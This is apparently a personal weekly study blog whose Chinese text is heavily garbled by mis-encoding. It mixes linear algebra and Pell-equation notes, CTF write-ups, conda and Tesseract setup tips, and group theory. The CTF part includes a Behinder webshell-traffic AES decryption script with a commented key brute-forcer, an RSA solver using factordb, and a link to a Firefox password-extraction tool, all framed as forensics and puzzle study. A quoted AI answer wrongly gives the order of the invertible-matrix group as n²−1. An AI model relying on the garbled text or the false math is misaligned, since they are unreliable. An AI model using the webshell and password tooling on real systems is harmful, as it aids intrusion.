<p><strong>å®šä¹‰1</strong> è®¾ $V$ ä¸ $Vâ€™$ éƒ½æ˜¯åŸŸ $F$ ä¸Šçš„çº¿æ€§ç©ºé—´ï¼Œå¦‚æœå­˜åœ¨ $V$ åˆ° $Vâ€™$ çš„ä¸€ä¸ªåŒå°„ $\sigma$ ï¼Œå¹¶ä¸” $\sigma$ ä¿æŒåŠ æ³•ä¸çº¯é‡ä¹˜æ³•ä¸¤ç§è¿ç®—ï¼Œå³ä½¿å¯¹äºä»»æ„ $\alpha, \beta\in V$,  $k \in F$ï¼Œæœ‰ï¼š<br>$$<br>\sigma (\alpha + \beta) &#x3D; \sigma(\alpha) + \sigma(\beta),\<br>\sigma (k\alpha) &#x3D; k\sigma (\alpha)<br>$$<br>é‚£ä¹ˆç§° $\sigma$ æ˜¯ $V$ åˆ° $Vâ€™$ çš„ä¸€ä¸ªåŒæ„æ˜ å°„ï¼ˆç®€ç§°ä¸ºåŒæ„ï¼‰ï¼›æ­¤æ—¶ç§° $V$ ä¸ $Vâ€™$ æ˜¯åŒæ„çš„ï¼Œè®°ä½œ $V \cong Vâ€™$ã€‚</p>
<p>ä»å®šä¹‰å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœåŸŸ $F$ ä¸Šçš„ä¸¤ä¸ªçº¿æ€§ç©ºé—´ $V$ ä¸ $Vâ€™$ æ˜¯åŒæ„çš„ï¼Œé‚£ä¹ˆ $V$ ä¸ $Vâ€™$ çš„å…ƒç´ ä¹‹é—´å­˜åœ¨ä¸€ä¸€å¯¹åº”ï¼š$\alpha \longmapsto \sigma(\alpha)$ï¼›å¹¶ä¸”è¿™ä¸ªæ˜ å°„ $\sigma$ ä¿æŒåŠ æ³•ä¸çº¯é‡ä¹˜æ³•ä¸¤ç§è¿ç®—ï¼Œç”±æ­¤å¯ä»¥æ¨å¯¼å‡º $\sigma$ å…·æœ‰ä¸‹åˆ—æ€§è´¨ï¼š</p>
<ul>
<li><strong>æ€§è´¨1</strong> $\sigma(0)$ æ˜¯ $Vâ€™$ çš„é›¶å…ƒã€‚</li>
<li><strong>æ€§è´¨2</strong> $V$ ä¸­çš„å‘é‡ç»„ $\alpha_1, \alpha_2, \alpha_3, \cdots, \alpha_s$ çº¿æ€§ç›¸å…³ï¼ˆæ— å…³ï¼‰ï¼Œå½“ä¸”ä»…å½“ $\sigma(\alpha_1), \sigma(\alpha_2), \cdots, \sigma(\alpha_s)$ æ˜¯ $Vâ€™$ ä¸­çš„çº¿æ€§ç›¸å…³ï¼ˆæ— å…³ï¼‰ç»„ã€‚</li>
<li><strong>æ€§è´¨3</strong> å¦‚æœ $\alpha_1, \alpha_2, \alpha_3, \cdots, \alpha_n$ æ˜¯ $V$ çš„ä¸€ä¸ªåŸºï¼Œ é‚£ä¹ˆ $\sigma(\alpha_1), \sigma(\alpha_2), \cdots, \sigma(\alpha_n)$ æ˜¯ $Vâ€™$ çš„ä¸€ä¸ªåŸºã€‚</li>
<li><strong>æ€§è´¨4</strong> å¦‚æœ $U$ æ˜¯ $V$ çš„ä¸€ä¸ªå­ç©ºé—´ï¼Œé‚£ä¹ˆ $\sigma(U)$ ä¹Ÿæ˜¯ $Vâ€™$ çš„ä¸€ä¸ªå­ç©ºé—´ï¼Œå¦‚æœ $U$ æ˜¯æœ‰é™ç»´çš„ï¼Œé‚£ä¹ˆ $\sigma(U)$ ä¹Ÿæ˜¯æœ‰é™ç»´çš„ï¼Œå¹¶ä¸”$dim_{\sigma_{(U)}} &#x3D; dim_{U}$</li>
</ul>
<p><strong>åˆ¤å®šï¼š</strong></p>
<ul>
<li><strong>å®šç†1</strong> åŸŸ$F$ä¸Šä¸¤ä¸ªæœ‰é™ç»´çš„çº¿æ€§ç©ºé—´åŒæ„çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯å®ƒä»¬çš„ç»´æ•°ç›¸åŒã€‚</li>
</ul>
<h3 id="Pellæ–¹ç¨‹"><a href="#Pellæ–¹ç¨‹" class="headerlink" title="Pellæ–¹ç¨‹"></a>Pellæ–¹ç¨‹</h3><p><strong>å®šä¹‰</strong> å½¢å¦‚ $x^{2} - Dy^{2} &#x3D; 1$ çš„äºŒå…ƒäºŒæ¬¡æ–¹ç¨‹ï¼Œå…¶ä¸­Dä¸ºæ­£æ•´æ•°ã€‚</p>
<p>å¯¹æ¨¡ $n$ çš„Pellæ–¹ç¨‹ï¼Œæˆ‘ä»¬æœ‰ï¼š<br>$$<br>x^{2} - Dy^{2} \equiv 1 \mod n<br>$$<br>æ„æˆè¯¥æ–¹ç¨‹çš„å…ƒç´ ï¼Œç§°ä¸ºç¾¤ã€‚</p>
<p>æ ¹æ®Pellæ–¹ç¨‹çš„æ€§è´¨ï¼Œæœ‰<strong>å…ƒç´ åŠ æ³•</strong>ï¼š<br>$$<br>(x_3, y_3) &#x3D; (x_1, y_1) \oplus (x_2, y_2) &#x3D; (x_1x_2 + Dy_1y_2, x_1y_2 + x_2y_1)<br>$$<br>å­˜åœ¨<strong>æ•°ä¹˜</strong>ï¼š</p>
<p>$e \otimes (x, y) &#x3D; (x, y) \oplus (x, y) \oplus \cdots \oplus(x, y)$</p>
<h1 id="230914"><a href="#230914" class="headerlink" title="230914"></a>230914</h1><h2 id="encoded"><a href="#encoded" class="headerlink" title="encoded"></a>encoded</h2><p>Salted__äº†è§£ä¸€ä¸‹ï¼Œè¿™ä¸ªæ˜¯é€šè¿‡opensslåŠ å¯†å¦‚æœä¸å¸¦base64å°±ä¼šå‡ºç°Saltedå­—æ®µæ‰“å¤´ã€‚å†çœ‹base64çš„å‰å‡ ä¸ªå­—æ®µU2Fsdç¡®å®šæ˜¯AESåŠ å¯†æ— è¯¯</p>
<h2 id="AreYouOK-Pro"><a href="#AreYouOK-Pro" class="headerlink" title="AreYouOK_Pro"></a>AreYouOK_Pro</h2><ul>
<li><p>ä¿®æ”¹æ–‡ä»¶åç¼€åï¼Œä¿®æ”¹ä¸º<code>.pcap</code></p>
</li>
<li><p>åè®®æŸ¥çœ‹ï¼Œå­˜åœ¨<code>RFCOMM</code>ï¼Œwiresharkç­›é€‰ä¸º<code>btrfcomm</code></p>
</li>
<li><p>968ä¹‹åçš„æ•°æ®åŒ…å­˜åœ¨æ–‡ä»¶ä¼ è¾“ï¼Œåˆ©ç”¨<code>btrfcomm &amp;&amp; data &amp;&amp; frame.number &gt;= 968</code>è¿›è¡Œç­›é€‰</p>
</li>
<li><p>å°†è¿™äº›æ•°æ®åŒ…å¯¼å‡ºä¸ºjsonï¼Œæå–å…¶ä¸­dataæ®µä¿¡æ¯å¹¶æ‰”æ‰æŠ¥æ–‡å¤´åï¼Œå‘ç°å†…å®¹ä¸ºä¸€å¼ å›¾ç‰‡ï¼Œä¿å­˜å‡ºæ¥</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">packets = json.loads(<span class="built_in">open</span>(<span class="string">&quot;1.json&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    data += packet[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;data&quot;</span>][<span class="string">&quot;data.data&quot;</span>].replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">data = data.split(<span class="string">&quot;a5a50100&quot;</span>)</span><br><span class="line">newdata = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    newdata += x[<span class="number">8</span>:]</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;111.png&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(newdata[<span class="number">24</span>:].decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿å­˜åæ‰“ä¸å¼€ï¼Œå¯èƒ½å­˜åœ¨å†—ä½™ä¿¡æ¯ï¼Œç›´æ¥é€šè¿‡<code>foremost</code>æŠŠé‡Œé¢çš„å›¾ç‰‡æå–å‡ºæ¥ï¼Œå¾—åˆ°ï¼š</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230914192029010.png" class="" title="image-20230914192029010">

<h2 id="Beyond"><a href="#Beyond" class="headerlink" title="Beyond"></a>Beyond</h2><img src="/2023/12/31/WeeklyStudy/image-20230914192825968.png" class="" title="image-20230914192825968">

<p>æ ‡æ˜ICMPå­˜æ´»ã€‚</p>
<p><em>æ•°æ®åŒ…è¡¨ç¤ºå‘ç›®æ ‡ä¸»æœºå‘é€äº†ä¸€ä¸ªICMP Echo Requestæ¶ˆæ¯ï¼ŒæŸ¥çœ‹ç›¸åº”æ•°æ®åŒ…çš„ä¿¡æ¯æ¥åˆ¤æ–­ä¸»æœºæ˜¯å¦å­˜æ´»ã€‚å¦‚æœæœ‰ç›¸åº”çš„ICMP Echo Replyæ•°æ®åŒ…ä½œä¸ºå“åº”ï¼Œåˆ™è¡¨æ˜ç›®æ ‡ä¸»æœºæ˜¯å­˜æ´»çš„ã€‚</em></p>
<p>ä½¿ç”¨<code>http &amp;&amp; http.response.code == 200</code>è¿›è¡Œç­›é€‰ï¼Œå†å¯¹å…¶è¿›è¡Œæ’åºï¼ŒæŸ¥çœ‹ç›¸å¯¹ç‰¹æ®Šçš„é•¿åº¦ï¼Œæ¯”å¦‚æœ€é•¿é•¿åº¦ï¼Œè¿½è¸ªhttpæµã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230914193250352.png" class="" title="image-20230914193250352">

<p>åˆ†æï¼ˆå®˜æ–¹wpï¼‰ï¼Œä¸ºå†°èV4.0æµé‡ï¼ŒæœåŠ¡ç«¯ä¸ºPHPï¼Œä½¿ç”¨é»˜è®¤çš„AESç®—æ³•ã€‚</p>
<p>è¿›è¡Œè§£å¯†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    c = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decodebs = base64.b64decode(data)</span><br><span class="line">    <span class="keyword">return</span> c.decrypt(decodebs)</span><br><span class="line"><span class="comment"># def Key_Brute(data):</span></span><br><span class="line"><span class="comment"># with open(&#x27;top500.txt&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line"><span class="comment"># plain = [i.strip() for i in f.readlines()]</span></span><br><span class="line"><span class="comment"># for i in plain:</span></span><br><span class="line"><span class="comment"># md5_enc = hashlib.md5(i).hexdigest()</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment"># key = md5_enc[:16].encode()</span></span><br><span class="line"><span class="comment"># AES_dec = Decrypt(key, data).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="comment"># cmd = re.findall(r&#x27;[sS]$cmd=&quot;(.*?)&quot;&#x27;, AES_dec)</span></span><br><span class="line"><span class="comment"># if cmd:</span></span><br><span class="line"><span class="comment"># print(&#x27;[*] Crack Success!!!&#x27; + &#x27;n&#x27; + &#x27;[*] Key: &#x27; + i.decode(&#x27;utf-8&#x27;) + &#x27;n[*] Webshell Key: &#x27; + md5_enc[:16])</span></span><br><span class="line"><span class="comment"># payload = base64.b64decode(cmd[0]).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="comment"># print(&#x27;[*] Payload: &#x27; + payload)</span></span><br><span class="line"><span class="comment"># break</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment"># print(&#x27;[-] Crack Failed&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">    md5_enc = hashlib.md5(<span class="string">b&#x27;hunting&#x27;</span>).hexdigest()</span><br><span class="line">    key = md5_enc[:<span class="number">16</span>].encode()</span><br><span class="line">    AES_dec = Decrypt(key, data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_dec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>230æµè§£å¯†åï¼Œå­˜åœ¨cmdç­‰ä¿¡æ¯</p>
<img src="/2023/12/31/WeeklyStudy/image-20230914194115441.png" class="" title="image-20230914194115441">

<h1 id="231019"><a href="#231019" class="headerlink" title="231019"></a>231019</h1><h2 id="CryptoCTF2023"><a href="#CryptoCTF2023" class="headerlink" title="CryptoCTF2023"></a>CryptoCTF2023</h2><blockquote>
<p>reference: </p>
<ul>
<li><a href="https://blog.csdn.net/luochen2436/article/details/131702220?spm=1001.2014.3001.5502">2023 CCTF â€” writeup-CSDNåšå®¢</a></li>
<li><a href="https://blog.csdn.net/m0_63321019/article/details/131797464">2023 CryptoCTF wp by lingfeng (easyåˆ†ç±»)-CSDNåšå®¢</a></li>
</ul>
</blockquote>
<p>ä¸€ç‚¹æ–°ä¸œè¥¿è¿›è¡Œæ¦‚æ‹¬ã€‚</p>
<h3 id="è°ƒç”¨factordb-comçš„apiæ¥å£ï¼Œè¿›è¡Œçˆ†ç ´ã€‚"><a href="#è°ƒç”¨factordb-comçš„apiæ¥å£ï¼Œè¿›è¡Œçˆ†ç ´ã€‚" class="headerlink" title="è°ƒç”¨factordb.comçš„apiæ¥å£ï¼Œè¿›è¡Œçˆ†ç ´ã€‚"></a>è°ƒç”¨<code>factordb.com</code>çš„apiæ¥å£ï¼Œè¿›è¡Œçˆ†ç ´ã€‚</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">PKEY = <span class="number">55208723145458976481271800608918815438075571763947979755496510859604544396672</span></span><br><span class="line">ENC = <span class="number">127194641882350916936065994389482700479720132804140137082316257506737630761</span></span><br><span class="line">c_high = ENC&lt;&lt;<span class="number">8</span></span><br><span class="line">n_high = (PKEY&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">8</span></span><br><span class="line">e_high = (PKEY &amp; (<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor_n</span>(<span class="params">n</span>):</span><br><span class="line">    url = <span class="string">&quot;http://factordb.com/api?query=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(n))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        fac = response.json()[<span class="string">&#x27;factors&#x27;</span>]</span><br><span class="line">        fac_data = [<span class="built_in">int</span>(i[<span class="number">0</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> fac]</span><br><span class="line">        <span class="keyword">return</span> fac_data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">p_q = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    n = n_high+i</span><br><span class="line">    fac_data = factor_n(n)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fac_data)==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> fac_data[<span class="number">0</span>].bit_length()==<span class="number">128</span> <span class="keyword">and</span> fac_data[<span class="number">1</span>].bit_length()==<span class="number">128</span> <span class="keyword">and</span> isPrime(fac_data[<span class="number">0</span>]) <span class="keyword">and</span> isPrime(fac_data[<span class="number">1</span>]):</span><br><span class="line">            p_q = fac_data</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p,q = <span class="built_in">int</span>(fac_data[<span class="number">0</span>]),<span class="built_in">int</span>(fac_data[<span class="number">1</span>])</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">        c = c_high + i</span><br><span class="line">        e = e_high + j</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                d = gmpy2.invert(e, phi)</span><br><span class="line">                m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">                flag = long_to_bytes(m)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(k&lt;=<span class="number">127</span> <span class="keyword">and</span> k &gt;=<span class="number">33</span> <span class="keyword">for</span> k <span class="keyword">in</span> flag):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">b&quot;CCTF&#123;&quot;</span>+flag+<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Risk"><a href="#Risk" class="headerlink" title="Risk"></a>Risk</h3><p>æ„é€ æ–¹ç¨‹ï¼Œä»¥åŠè¿›è¡Œçº¦æŸæ±‚è§£$a, b$ä»è€Œè®¡ç®—å‡º$p, q$ã€‚</p>
<h1 id="231020"><a href="#231020" class="headerlink" title="231020"></a>231020</h1><h2 id="SCYDæ•°æ®å®‰å…¨"><a href="#SCYDæ•°æ®å®‰å…¨" class="headerlink" title="SCYDæ•°æ®å®‰å…¨"></a>SCYDæ•°æ®å®‰å…¨</h2><h3 id="Baby-TCP"><a href="#Baby-TCP" class="headerlink" title="Baby_TCP"></a>Baby_TCP</h3><p><a href="https://github.com/lclevy/firepwd">GitHub - lclevy&#x2F;firepwd: firepwd.py, an open source tool</a></p>
<h1 id="231121"><a href="#231121" class="headerlink" title="231121"></a>231121</h1><h2 id="å·ç§¯æ¦‚å¿µ"><a href="#å·ç§¯æ¦‚å¿µ" class="headerlink" title="å·ç§¯æ¦‚å¿µ"></a>å·ç§¯æ¦‚å¿µ</h2><img src="/2023/12/31/WeeklyStudy/image-20231121183714832.png" class="" title="image-20231121183714832">

<img src="/2023/12/31/WeeklyStudy/v2-ed62c7d0e5ba9e6c602f7673435ae846_r.jpg" class="" title="img">

<h1 id="231213"><a href="#231213" class="headerlink" title="231213"></a>231213</h1><h2 id="condaæŠ¥é”™"><a href="#condaæŠ¥é”™" class="headerlink" title="condaæŠ¥é”™"></a>condaæŠ¥é”™</h2><blockquote>
<p>Invalid version spec: &#x3D;2. 7</p>
</blockquote>
<p><code>conda</code>æŠ¥é”™ï¼ŒåŸå› æ˜¯ç‰ˆæœ¬è€äº†ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªpythoné«˜ç‰ˆæœ¬è™šæ‹Ÿç¯å¢ƒã€‚</p>
<ul>
<li><p>åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼š<code>conda create -n [xxx] python=3.x conda=4.9.2</code></p>
</li>
<li><p>æ¿€æ´»è™šæ‹Ÿç¯å¢ƒï¼š<code>conda activate  [xxx]</code></p>
</li>
<li><p>ä¼‘çœ è™šæ‹Ÿç¯å¢ƒï¼š<code>conda deactivate  [xxx]</code></p>
</li>
<li><p>è™šæ‹Ÿç¯å¢ƒç½—åˆ—ï¼š<code>conda info --envs</code> æˆ–è€… <code>conda info -e</code> æˆ–è€… <code>conda env list</code></p>
</li>
<li><p>åˆ é™¤è™šæ‹Ÿç¯å¢ƒï¼š<code>conda remove --name [xxx] --all</code></p>
</li>
<li><p>ç½—åˆ—è™šæ‹Ÿç¯å¢ƒå®‰è£…çš„åº“ï¼š<code>conda list</code></p>
</li>
</ul>
<p>æ›´æ¢é•œåƒæºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes </span><br></pre></td></tr></table></figure>

<h1 id="231214"><a href="#231214" class="headerlink" title="231214"></a>231214</h1><h2 id="å®¸æ-231214â€”â€”-GL-n-fp-ç¾¤é˜¶çš„é¢˜ç›®ç±»å‹ç ”ç©¶ã€‚"><a href="#å®¸æ-231214â€”â€”-GL-n-fp-ç¾¤é˜¶çš„é¢˜ç›®ç±»å‹ç ”ç©¶ã€‚" class="headerlink" title="å®¸æ_231214â€”â€”$GL(n,fp)$ç¾¤é˜¶çš„é¢˜ç›®ç±»å‹ç ”ç©¶ã€‚"></a>å®¸æ_231214â€”â€”$GL(n,fp)$ç¾¤é˜¶çš„é¢˜ç›®ç±»å‹ç ”ç©¶ã€‚</h2><img src="/2023/12/31/WeeklyStudy/image-20231214171348882.png" class="" title="image-20231214171348882">

<img src="/2023/12/31/WeeklyStudy/image-20231214181343635.png" class="" title="image-20231214181343635">

<blockquote>
<p>é—®OpenAI 3.5</p>
</blockquote>
<p>ä¸€ä¸ªéå¥‡å¼‚çŸ©é˜µï¼ˆå³å¯é€†çŸ©é˜µï¼‰çš„ç¾¤çš„é˜¶å¯ä»¥é€šè¿‡å…¶çŸ©é˜µçš„ç»´åº¦æ¥ç¡®å®šã€‚å¯¹äº n é˜¶çŸ©é˜µï¼Œå…¶ç¾¤çš„é˜¶ä¸º $n^2 - 1$ã€‚</p>
<p>è¿™æ˜¯å› ä¸ºå¯¹äºä¸€ä¸ªéå¥‡å¼‚çŸ©é˜µ Aï¼Œå®ƒå¯ä»¥è¡¨ç¤ºä¸º $A &#x3D; PDP^(-1)$ï¼Œå…¶ä¸­ D ä¸ºå¯¹è§’çŸ©é˜µï¼ŒP æ˜¯å¯é€†çŸ©é˜µã€‚ç”±äº P æ˜¯å¯é€†çš„ï¼Œå®ƒå±äº $nÃ—n$ å¯é€†çŸ©é˜µçš„é›†åˆï¼Œè¿™ä¸ªé›†åˆçš„é˜¶ä¸º $n^2$ã€‚è€Œå¯¹è§’çŸ©é˜µ D çš„å¯¹è§’çº¿ä¸Šæœ‰ $n$ ä¸ªéé›¶å…ƒç´ ï¼Œå› æ­¤ D çš„é˜¶æ˜¯ $n$ã€‚æ‰€ä»¥å¯é€†çŸ©é˜µçš„ç¾¤çš„é˜¶ä¸º $n^2 - 1$ã€‚</p>
<p>å› æ­¤ï¼Œå¯¹äºä¸€ä¸ªéå¥‡å¼‚çŸ©é˜µçš„ç¾¤çš„é˜¶æ˜¯ $n^2 - 1$ï¼Œå…¶ä¸­ $n$ ä¸ºçŸ©é˜µçš„ç»´åº¦ã€‚</p>
<h1 id="231215"><a href="#231215" class="headerlink" title="231215"></a>231215</h1><h2 id="å®‰è£…Tesseract-OCR"><a href="#å®‰è£…Tesseract-OCR" class="headerlink" title="å®‰è£…Tesseract-OCR"></a>å®‰è£…Tesseract-OCR</h2><ol>
<li>å•ç‹¬çš„pytesseractåŒ…æ˜¯æ— æ³•è¿è¡Œçš„ï¼Œéœ€è¦ä¸‹è½½Tesseract-OCR</li>
<li>ä¸‹è½½é“¾æ¥ï¼š<a href="https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-setup-4.00.00dev.exe">https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-setup-4.00.00dev.exe</a></li>
<li>å®‰è£…ï¼šæŒ‰ç…§é»˜è®¤çš„å®‰è£…å°±è¡Œï¼Œæˆ‘è¿™é‡Œå°†å®‰è£…è·¯å¾„æ”¹ä¸ºD:\Programe Files\Tesseract-OCRï¼Œé»˜è®¤æ˜¯C:\Programe Files\Tesseract-OCR</li>
<li>é…ç½®ç¯å¢ƒå˜é‡ï¼ˆè¿™é‡Œé…ç½®çš„æ˜¯ç³»ç»Ÿå˜é‡ï¼‰ï¼š<ol>
<li>æ–°å»ºå˜é‡ï¼šTESSDATA_PREFIX</li>
<li>è·¯å¾„ï¼Œ<code>Tesseract-OCR</code>çš„å®‰è£…è·¯å¾„ã€‚</li>
</ol>
</li>
</ol>
<h1 id="231222"><a href="#231222" class="headerlink" title="231222"></a>231222</h1><h2 id="ç ´è§£å¯¹ç§°æ€§çš„å¿…å¤‡åˆ©å™¨â€”â€”ç¾¤è®º"><a href="#ç ´è§£å¯¹ç§°æ€§çš„å¿…å¤‡åˆ©å™¨â€”â€”ç¾¤è®º" class="headerlink" title="ç ´è§£å¯¹ç§°æ€§çš„å¿…å¤‡åˆ©å™¨â€”â€”ç¾¤è®º"></a>ç ´è§£å¯¹ç§°æ€§çš„å¿…å¤‡åˆ©å™¨â€”â€”ç¾¤è®º</h2><blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIyNjc2NzY4OA==&mid=2247485239&idx=1&sn=f013f3da01d2dc3afab04365ddc0d7cd&chksm=e86a2110df1da8065530d75de00c85485c3170a0b35bac7d574ee7a1927976294bfc431039d5&scene=21#wechat_redirect">ç ´è§£å¯¹ç§°æ€§çš„å¿…å¤‡åˆ©å™¨â€”â€”ç¾¤è®º (qq.com)</a></p>
</blockquote>
<h3 id="æ—‹è½¬å¯¹ç§°æ€§"><a href="#æ—‹è½¬å¯¹ç§°æ€§" class="headerlink" title="æ—‹è½¬å¯¹ç§°æ€§"></a>æ—‹è½¬å¯¹ç§°æ€§</h3><img src="/2023/12/31/WeeklyStudy/640.jpeg" class="" title="å›¾ç‰‡">

<p>ä¸éš¾çœ‹å‡ºï¼ŒæŠŠä¸Šé¢çš„å›¾æ¡ˆ a) ï¼ˆé¡ºæ—¶é’ˆæˆ–é€†æ—¶é’ˆï¼‰æ—‹è½¬ 90 åº¦çš„æ•´æ•°å€ï¼Œå®ƒéƒ½èƒ½å’Œè‡ªå·±é‡åˆï¼›å›¾åƒ b) å’Œ k) è¦ï¼ˆé¡ºæ—¶é’ˆæˆ–é€†æ—¶é’ˆï¼‰æ—‹è½¬ 72 åº¦çš„æ•´æ•°å€ä¹Ÿèƒ½å’Œè‡ªå·±é‡åˆï¼›å›¾åƒ f) å’Œ g) è¦ç‰¹æ®Šä¸€äº›ï¼Œå¿…é¡»ï¼ˆé¡ºæ—¶é’ˆæˆ–é€†æ—¶é’ˆï¼‰æ—‹è½¬ 120 åº¦çš„æ•´æ•°å€æ‰èƒ½å’Œè‡ªå·±é‡åˆã€‚æˆ‘ä»¬æŠŠå›¾å½¢çš„è¿™ç§æ€§è´¨ç§°ä¸ºæ—‹è½¬å¯¹ç§°æ€§ï¼ˆRotational symmetryï¼‰ã€‚</p>
<p>æ­¤å¤–ï¼Œè™½ç„¶ a) å’Œ e) éƒ½å…·æœ‰ Ï€&#x2F;2ï¼ˆæœ¬æ–‡é»˜è®¤ä½¿ç”¨å¼§åº¦åˆ¶ï¼‰æ•´æ•°å€çš„æ—‹è½¬å¯¹ç§°æ€§ï¼Œä½† e) æ¯” a) æ›´åŠ å‰å®³ï¼Œå› ä¸ºå¦‚æœæŠŠè¿™ä¸¤ä¸ªå›¾æ¡ˆæ²¿æ°´å¹³æˆ–ç«–ç›´æ–¹å‘ç¿»æŠ˜ä¸€ä¸‹ï¼Œe) ä¾ç„¶æˆ‘è¡Œæˆ‘ç´ ï¼Œ a) å´å·²ç»è¿·å¤±è‡ªæˆ‘äº†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç§° e) å…·æœ‰ç¿»æŠ˜å¯¹ç§°æ€§ï¼ˆFolding symmetryï¼‰ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/640-1703226581100-3.jpeg" class="" title="å›¾ç‰‡">

<p>é™¤äº†æ—‹è½¬ä¸ç¿»æŠ˜ä»¥å¤–ï¼Œè¿˜æœ‰å¹³ç§»å¯¹ç§°æ€§ï¼Œä»¥åŠæ›´åŠ æ·±åˆ»çš„æ´›ä¼¦å…¹ï¼ˆæ—¶ç©ºï¼‰å¯¹ç§°æ€§ç­‰ç­‰ã€‚</p>
<p>æŠŠæ‰€æœ‰çš„å¯¹ç§°æ€§éƒ½çº³å…¥å›Šä¸­å‘¢ï¼Ÿåœ¨æ•°å­¦å®¶çœ¼é‡Œç­”æ¡ˆåªæœ‰ä¸€ä¸ªå­—â€”â€”<strong>ç¾¤</strong>ï¼ˆGroupï¼‰ã€‚</p>
